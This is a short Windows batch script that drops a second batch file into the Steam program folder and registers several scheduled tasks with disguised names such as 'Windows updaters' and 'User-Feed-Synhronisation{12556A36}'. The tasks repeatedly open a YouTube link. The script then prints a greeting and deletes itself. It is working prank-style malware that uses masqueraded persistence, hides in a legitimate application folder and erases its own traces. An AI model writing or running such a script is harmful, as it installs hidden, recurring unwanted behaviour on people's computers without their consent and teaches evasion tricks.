@echo off
chcp 1251
echo @echo off> "C:\Program Files (x86)\Steam\newbat.bat"
echo echo test>> "C:\Program Files (x86)\Steam\newbat.bat"
echo schtasks /Create /SC DAILY /TN "MCSN update" /TR ""C:\Program Files (x86)\Steam\newbat.bat"\System32\cmd.exe /C start "q" "https://www.youtube.com/watch?v=G1IbRujko-A"" /RI 30 /F>>"C:\Program Files (x86)\Steam\newbat.bat"
schtasks /Create /SC DAILY /TN "MCSN update" /TR "C:\Windows\System32\cmd.exe /C start "https://www.youtube.com/watch?v=G1IbRujko-A"" /RI 30 /F
schtasks /Create /SC DAILY /TN "Windows updaters" /TR "C:\Program Files (x86)\Steam\newbat.bat" /RI 600 /F /DU 700
schtasks /Create /SC DAILY /TN "User-Feed-Synhronisation{12556A36}" /TR "C:\Program Files (x86)\Steam\newbat.bat" /RI 600 /F /DU 700
start cmd /K echo Привет, Мир!
start "q" "https://www.youtube.com/watch?v=G1IbRujko-A"
del %0